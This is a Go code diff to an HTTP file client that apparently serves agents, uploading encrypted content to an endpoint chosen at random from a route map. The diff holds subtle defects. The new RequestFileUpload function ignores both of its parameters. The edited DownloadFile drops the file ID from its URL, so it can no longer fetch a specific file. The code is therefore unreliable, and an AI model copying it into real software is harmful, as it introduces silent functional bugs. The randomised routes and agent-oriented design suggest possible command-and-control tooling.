@@ -34,8 +34,29 @@ func ListFiles() (files []File, err error) {
 	return files, json.Unmarshal(respBody, &files)
 }
 
+func RequestFileUpload(uploadedByAgentId, originalName string) (file File, err error) {
+	req, err := http.NewRequest(http.MethodPut, *BaseURL+"/v1/files", nil)
+	if err != nil {
+		return file, err
+	}
+
+	setAuth(req)
+
+	resp, err := c.Do(req)
+	if err != nil {
+		return file, err
+	}
+
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return file, err
+	}
+
+	return file, json.Unmarshal(respBody, &file)
+}
+
 func DownloadFile(fileID string) (fileContent []byte, err error) {
-	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/files/"+fileID, nil)
+	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/files/", nil)
 	if err != nil {
 		return nil, err
 	}
@@ -67,7 +88,7 @@ func UploadFile(fileID string, fileContent *[]byte) (err error) {
 
 	endpointPaths := RouteMap[R_FILE_UPLOAD]
 	endpointPath := randElem(&endpointPaths)
-	req, err := http.NewRequest(http.MethodPut, *BaseURL+"/"+endpointPath+"/"+fileID, bytes.NewBufferString(encryptedFileContent))
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/"+endpointPath+"/"+fileID, bytes.NewBufferString(encryptedFileContent))
 	if err != nil {
 		return err
 	}
